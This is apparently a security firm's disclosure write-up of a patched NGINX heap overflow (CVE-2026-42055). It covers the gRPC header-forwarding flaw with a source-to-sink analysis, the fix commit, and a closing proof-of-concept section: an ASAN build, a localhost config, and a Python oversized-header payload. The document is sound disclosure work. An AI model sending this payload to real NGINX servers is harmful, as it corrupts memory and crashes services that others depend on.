---
schema_version: "1.0.0"
document_id: "0bb18c1661b53e85322a5692f55d9a4ae984854659e05d80e3dbb91ec1194d06"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/nginx-grpc-forwarded-header-hpack-overflow"
published_at: "2026-06-17T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T21:13:02.492982+00:00"
content_hash: "sha256:61a55c439a876cf8dbafdc63873315d10943b390f72c306a289d6ecce6e802b0"
---

# gRPC forwarded headers can overflow the upstream HPACK request buffer (CVE-2026-42055)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


High


CVE-2026-42055


2026-06-17


# gRPC forwarded headers can overflow the upstream HPACK request buffer (CVE-2026-42055)


## Summary


NGINX gRPC upstream sizing reserved four HPACK length bytes but serialized larger raw header strings with five


When an HTTP/1.x request reaches a` grpc_pass` location, NGINX forwards client request headers by default. Before the fix,` ngx_http_grpc_create_request()` sized each forwarded header name and value with the fixed` NGX_HTTP_V2_INT_OCTETS` allowance of four HPACK integer bytes, then later serialized the same strings through the variable-length HPACK encoder.


If` ignore_invalid_headers off` allowed invalid raw-unfriendly header names to be retained, and` large_client_header_buffers` allowed multi-megabyte header lines, an unauthenticated client could send forwarded header names and values of` NGX_HTTP_V2_MAX_FIELD + 1` bytes. For raw HPACK strings at that length, the encoder emits a five-byte length prefix while the allocation budget reserved four. The final request buffer was therefore undersized, and the continuation-frame insertion path could write beyond` b->end` .


F5 published the issue as[CVE-2026-42055](https://www.cve.org/CVERecord?id=CVE-2026-42055) in advisory[K000161584](https://my.f5.com/manage/s/article/K000161584) , CWE-122, with CVSS 3.1 score 8.1. The public NGINX 1.31.2 changelog describes worker heap memory corruption or segmentation fault when` ignore_invalid_headers off` and large` large_client_header_buffers` are used while proxying a crafted request to an HTTP/2 or gRPC backend. NGINX fixed both affected upstream builders in commit[26d824e](https://github.com/nginx/nginx/commit/26d824ec3a2f819300edce0ab3b055751c9843ff) , merged through[PR #1474](https://github.com/nginx/nginx/pull/1474) , and credited Mufeed VH of Winfunc Research.


### CVSS Score


Vector


N


Complexity


H


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 1519


src /http


/ngx_http_request.c


ngx_http_process_request_header()


Sink


Line 1128


src /http


/modules


/ngx_http_grpc_module.c


ngx_http_grpc_create_request()


## Source-to-Sink Analysis


1


src/http/ngx_http_parse.c:953


The HTTP/1.x parser can mark unusual header-name bytes as invalid without immediately rejecting the header line. Bytes such as` ~` are useful for this proof because they also force raw HPACK encoding instead of a shorter Huffman representation.


CPP


```text
r->invalid_header =  1  ;


break  ;


```


2


src/http/ngx_http_request.c:1489-1519


Invalid headers are skipped only when` ignore_invalid_headers` is enabled. With` ignore_invalid_headers off` , NGINX keeps the attacker-controlled header name and value lengths in` r->headers_in.headers` .


CPP


```text
if   (r->invalid_header && cscf->ignore_invalid_headers) {
/* skip invalid headers */
continue  ;
}


h->key.len = r->header_name_end - r->header_name_start;
h->key.data = r->header_name_start;
h->value.len = r->header_end - r->header_start;
h->value.data = r->header_start;


```


3


src/http/modules/ngx_http_grpc_module.c:4432


The gRPC upstream configuration passes client request headers by default, so accepted client headers flow into the upstream HTTP/2/gRPC request builder unless explicitly filtered.


CPP


```text
ngx_conf_merge_value  (conf->upstream.pass_request_headers,
prev->upstream.pass_request_headers,  1  );


```


4


src/http/modules/ngx_http_grpc_module.c:843-846 (before fix)


The vulnerable sizing pass used a fixed four-octet HPACK integer budget for each forwarded header name and value. That budget is only sound while the HPACK string length is at most` NGX_HTTP_V2_MAX_FIELD` .


CPP


```text
len +=  1   + NGX_HTTP_V2_INT_OCTETS + header[i].key.len
+ NGX_HTTP_V2_INT_OCTETS + header[i].value.len;


```


5


src/http/v2/ngx_http_v2.h:23-25


` NGX_HTTP_V2_MAX_FIELD` is derived from the four-octet HPACK integer allowance. A raw string of 2,097,279 bytes is one byte over that boundary and requires an additional continuation byte.


CPP


```text
# define   NGX_HTTP_V2_INT_OCTETS           4
# define   NGX_HTTP_V2_MAX_FIELD                                                 \
(127 + (1 << (NGX_HTTP_V2_INT_OCTETS - 1) * 7) - 1)


```


6


src/http/modules/ngx_http_grpc_module.c:1084-1087 (before fix)


Serialization used the real HPACK string encoder for the same forwarded name and value.` ngx_http_v2_write_int()` writes as many continuation bytes as the value requires, so the write can exceed the earlier fixed budget.


CPP


```text
b->last =  ngx_http_v2_write_name  (b->last, header[i].key.data,
header[i].key.len, tmp);
b->last =  ngx_http_v2_write_value  (b->last, header[i].value.data,
header[i].value.len, tmp);


```


7


src/http/modules/ngx_http_grpc_module.c:843-866 (fix, commit 26d824e)


The upstream fix rejects forwarded header names and values above` NGX_HTTP_V2_MAX_FIELD` before adding them to the buffer length, restoring the invariant that four reserved HPACK integer octets are enough.


CPP


```text
if   (header[i].key.len > NGX_HTTP_V2_MAX_FIELD) {
ngx_log_error  (NGX_LOG_ERR, r->connection->log,  0  ,
"too long http2 header name: \"%V\""  ,
&header[i].key);
return   NGX_ERROR;
}


if   (header[i].value.len > NGX_HTTP_V2_MAX_FIELD) {
ngx_log_error  (NGX_LOG_ERR, r->connection->log,  0  ,
"too long http2 header value: \"%V: %V\""  ,
&header[i].key, &header[i].value);
return   NGX_ERROR;
}


len +=  1   + NGX_HTTP_V2_INT_OCTETS + header[i].key.len
+ NGX_HTTP_V2_INT_OCTETS + header[i].value.len;


```


## Impact Analysis


### Critical Impact


The demonstrated impact is a remote, unauthenticated heap out-of-bounds write in an NGINX worker process under restrictive non-default configuration. The ASAN proof aborts the worker in` ngx_http_grpc_create_request()` , confirming availability impact and heap memory corruption. The public CVE record states that code execution is possible when ASLR is disabled or bypassed; this entry does not claim a completed production code-execution exploit.


### Attack Surface


NGINX Open Source and NGINX Plus deployments with a reachable` grpc_pass` location. The public CVE record lists affected Open Source ranges as` 1.13.10` before` 1.31.2` on mainline and` 1.30.2` before` 1.30.3` on stable, with NGINX Plus R36 and R37 patch ranges also affected.


### Preconditions


The location must use` grpc_pass` ; request-header forwarding must remain enabled;` ignore_invalid_headers off` must allow invalid raw header names to be retained; and` large_client_header_buffers` must allow header lines larger than 2 MiB. Default NGINX settings block this exact trigger because invalid headers are ignored and large header buffers are much smaller.


## Proof of Concept


### Environment Setup


Build a vulnerable NGINX revision before commit` 26d824e` , such as` e8053c867f9ab14f323e3019ccab585d857abb66` , with ASAN and HTTP/2 support:


BASH


```text
./auto/configure --with-http_v2_module --with-debug \
--with-cc-opt= '-O1 -g -fsanitize=address -fno-omit-frame-pointer'   \
--with-ld-opt= '-fsanitize=address'
make -j " $(getconf _NPROCESSORS_ONLN 2>/dev/null || sysctl -n hw.ncpu)  "


```


### Target Configuration


Run a disposable localhost-only server with invalid headers retained and very large header buffers:


NGINX


```text
worker_processes 1;
master_process off;
daemon off;
error_log stderr debug;


events { worker_connections 1024; }


http {
access_log off;
ignore_invalid_headers off;
large_client_header_buffers 8 5m;


server {
listen 127.0.0.1:<front_port>;
location / {
grpc_set_header Host "";
grpc_pass grpc://127.0.0.1:<unused_loopback_port>;
}
}
}


```


### Exploit Delivery


Send a request containing two forwarded headers where both the name and value are 2,097,279` ~` bytes:


PYTHON


```text
payload =  bytearray  ( b"GET /x HTTP/1.1\r\nHost: localhost\r\n"  )
for   _  in    range  ( 2  ):
payload.extend( b"~"   *  2097279  )
payload.extend( b": "  )
payload.extend( b"~"   *  2097279  )
payload.extend( b"\r\n"  )
payload.extend( b"Connection: close\r\n\r\n"  )


sock.sendall(payload)


```


The proof model reported` allocated=8393824` ,` final_size=8393825` , and` overflow_bytes=1` for the corrected trigger. A short-name/value-only control stayed below the allocation.


### Outcome


The ASAN report confirms heap memory corruption while constructing the upstream gRPC request. After commit` 26d824e` , the oversized header name or value is rejected before allocation and serialization, so no worker abort or ASAN heap-buffer-overflow should occur.


**Expected Response:** A vulnerable ASAN build aborts in the worker with:


TEXT


```text
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 536
ngx_http_grpc_create_request ngx_http_grpc_module.c:1128
SUMMARY: AddressSanitizer: heap-buffer-overflow ngx_http_grpc_module.c:1128 in ngx_http_grpc_create_request


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/commit/26d824ec3a2f819300edce0ab3b055751c9843ff)
